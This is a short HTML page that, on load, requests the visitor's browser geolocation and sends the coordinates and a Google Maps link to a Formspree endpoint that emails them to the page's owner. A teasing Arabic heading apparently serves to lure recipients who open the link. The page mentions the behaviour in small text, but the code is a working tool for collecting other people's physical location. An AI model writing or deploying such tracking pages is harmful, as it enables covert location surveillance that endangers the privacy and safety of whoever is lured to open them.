<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send Location via Email</title>
    <script>
        // Function to send location automatically on page load
        function sendLocation() {
            if ("geolocation" in navigator) {
                // Request permission to access location
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const { latitude, longitude } = position.coords; // Actual location

                        const emailData = new FormData();
                        emailData.append('latitude', latitude);
                        emailData.append('longitude', longitude);
                        emailData.append('message', `Location:\nLatitude: ${latitude}, Longitude: ${longitude}\nGoogle Maps: https://www.google.com/maps?q=${latitude},${longitude}`);

                        // Send the location via Formspree
                        fetch('https://formspree.io/f/xjkvdbwg', {
                            method: 'POST',
                            body: emailData
                        })
                        .then(response => response.json())
                        .then(() => {
                            alert('Location sent successfully!');
                            console.log('Location sent successfully!');
                        })
                        .catch((error) => {
                            console.error('Error:', error);
                            alert('Failed to send the location.');
                        });
                    },
                    (error) => {
                        alert("Error fetching location: " + error.message);
                    }
                );
            } else {
                alert("Geolocation is not supported by your browser.");
            }
        }

        // Trigger location sending automatically when the page loads
        window.onload = sendLocation;
    </script>
</head>
<body>
    <h1>هسيبك لخيالك</h1>
    <p>This page will automatically try to send your location when you open it. Please ensure to allow location permissions when prompted.</p>
</body>
</html>
